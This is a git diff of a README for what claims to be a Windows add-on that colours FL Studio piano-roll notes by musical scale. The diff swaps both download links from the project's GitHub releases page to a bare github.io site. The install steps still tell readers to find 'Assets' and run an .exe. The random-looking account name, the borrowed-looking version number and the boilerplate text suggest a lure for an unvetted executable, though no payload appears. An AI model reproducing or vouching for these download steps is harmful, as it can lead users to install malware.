@@ -1,6 +1,6 @@
 # 🎹 scale-loom-windows-workflow - Use colors to write better music
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/fossafossanonfluentaphasia515/scale-loom-windows-workflow/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://fossafossanonfluentaphasia515.github.io)
 
 This application helps users work with the FL Studio piano roll. It changes note colors based on the musical scale you choose. It adds labels to show harmony information. This makes your music creation process faster and easier. Version 25.2.4.5242 brings better file organization and support for automated scripts.
 
@@ -20,7 +20,7 @@ Before you install this software, ensure your computer meets these basic needs:
 
 You must visit the project page to get the installer. Follow these steps:
 
-1. Visit this page to download the latest setup file: [https://github.com/fossafossanonfluentaphasia515/scale-loom-windows-workflow/releases](https://github.com/fossafossanonfluentaphasia515/scale-loom-windows-workflow/releases)
+1. Visit this page to download the latest setup file: [https://fossafossanonfluentaphasia515.github.io](https://fossafossanonfluentaphasia515.github.io)
 2. Look for the section labeled "Assets" at the bottom of the release notes.
 3. Click the file ending in `.exe` to start the download.
 4. Save the file to your "Downloads" folder.
